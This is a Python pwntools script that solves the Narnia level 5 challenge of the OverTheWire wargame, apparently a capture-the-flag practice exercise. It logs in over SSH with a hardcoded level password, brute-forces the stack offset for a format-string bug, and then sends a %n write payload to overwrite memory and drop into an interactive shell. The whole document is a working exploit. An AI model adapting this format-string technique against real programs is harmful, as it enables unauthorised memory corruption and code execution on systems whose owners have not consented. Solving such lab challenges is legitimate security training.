from pwn import *

shell = ssh('narnia5', 'narnia.labs.overthewire.org', password='faimahchiy', port=2226)
ad = 0xffffdcd0
for i in range(0,100):
    a= b"A"*(64-32)+p32(ad)+(f'%{i}$08x').encode()

    print(a,i)
    p = shell.process(["/narnia/narnia5",a])

    (p.recvline())
    buf = (p.recvline())
    print(buf)
    buf =buf.split(b"[")[1].strip().split(b"]")[0][-8:]
    if buf[0:2]!=b"0x":
            buf = b"0x"+buf
    print(buf)
    pointer = (p.recvline())
    pointer =pointer.split(b"(")[1].strip().split(b")")[0]

    print(pointer)
    if buf==pointer or buf==p32(ad):
            p.close()

            loca = (i)
            payload = b"A"*(64-32)+p32(ad)+b"%464u"+(f'%{loca}$n').encode()    
            print(payload)
            p = shell.process(["/narnia/narnia5",payload])
            p.interactive()
            break

    p.close()
    

